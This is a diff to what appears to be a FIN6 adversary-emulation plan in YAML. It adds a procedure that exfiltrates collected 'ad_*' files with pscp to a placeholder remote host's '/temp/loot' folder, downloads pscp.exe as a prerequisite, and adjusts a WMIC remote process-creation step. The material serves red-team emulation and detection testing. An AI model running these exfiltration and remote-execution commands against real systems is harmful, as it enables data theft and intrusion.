@@ -437,7 +437,7 @@
     name: "Archive Collected Data: Archive via Utility"
   cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
   procedure_group: procedure_collection
-  procedure_step: "4.1"
+  procedure_step: "4.1.1"
   platforms:
     windows:
       cmd:
@@ -479,6 +479,74 @@
   - name: command_prompt
     command: |
       "#{7zip_exe}" a -mx3 ad.7z ad_*
+
+- id: 6824cbb6-f3e1-4081-8a63-d72ae368cb23
+  name: Exfiltration with PSCP
+  description: Initiate an interactive SSH session with a remote server with pscp
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+  procedure_group: procedure_exfiltration
+  procedure_step: "4.1.2"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          "#{pscp_local_path}"\pscp.exe -P "#{pscp_port}" "{pscp_exfil_files} "#{pscp_remote_user}"@"#{pscp_remote_host}":"#{pscp_drop_location}"
+        payloads:
+        - pscp.exe
+
+  input_arguments:
+    pscp_port:
+      description: Connection port for use with pscp
+      type: String
+      default: 22
+
+    pscp_exfil_files:
+      description: Files to be exfiltrated
+      type: Path
+      default: C:\Windows\Temp\ad_*
+
+    pscp_remote_user:
+      description: Remote user to connect with pscp
+      type: String
+      default: root
+
+    pscp_remote_host:
+      description: Hostname or IP to connect with pscp
+      type: String
+      default: 192.0.2.20
+
+    pscp_drop_location:
+      description: Remote location to drop exfiltration files with pscp
+      type: Path
+      default: /temp/loot
+
+    pscp_url:
+      description: Path to download pscp exe file
+      type: URL
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
+
+    pscp_local_path:
+      description: Local path to pscp exe file
+      type: Path
+      default: C:\Windows\Temp
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      pscp.exe must be located at "#{pscp_local_path}"
+    prereq_command: |
+      if (Test-Path "#{pscp_local_path}"\pscp.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{pscp_url}" -OutFile "#{pscp_local_path}"\pscp.exe
+
+  executors:
+  - name: command_prompt
+    command: |
+      "#{pscp_local_path}"\pscp.exe -P "#{pscp_port}" "{pscp_exfil_files}" "#{pscp_remote_user}"@"#{pscp_remote_host}":"#{pscp_drop_location}"
 
 # Phase 1/2: Exfiltration
 
@@ -611,16 +679,20 @@
     windows:
       cmd:
         command: |
-          wmic /node:#{node} process call create #{process_to_execute}
+          wmic /node:#{node} process call create "#{path_to_execute}"
         cleanup: |
-          wmic /node:#{node} process where name=#{process_to_execute} del >nul 2>&1
+          wmic /node:#{node} process where name="#{process_name_to_kill}" delete >nul 2>&1
 
   input_arguments:
     node:
       description: IP address
       type: string
       default: 127.0.0.1
-    process_to_execute:
+    path_to_execute:
+      description: Name or path of process to execute
+      type: string
+      default: notepad.exe
+    process_name_to_kill:
       description: Name or path of process to execute
       type: string
       default: notepad.exe
@@ -629,9 +701,9 @@
   - name: command_prompt
     elevation_required: false
     command: |
-      wmic /node:#{node} process call create #{process_to_execute}
+      wmic /node:#{node} process call create "#{path_to_execute}"
     cleanup_command: |
-      wmic /node:#{node} process where name="#{process_to_execute}" delete >nul 2>&1
+      wmic /node:#{node} process where name="#{process_name_to_kill}" delete >nul 2>&1
 
 # Phase 2: Persistence - Point of Sale (POS)
 
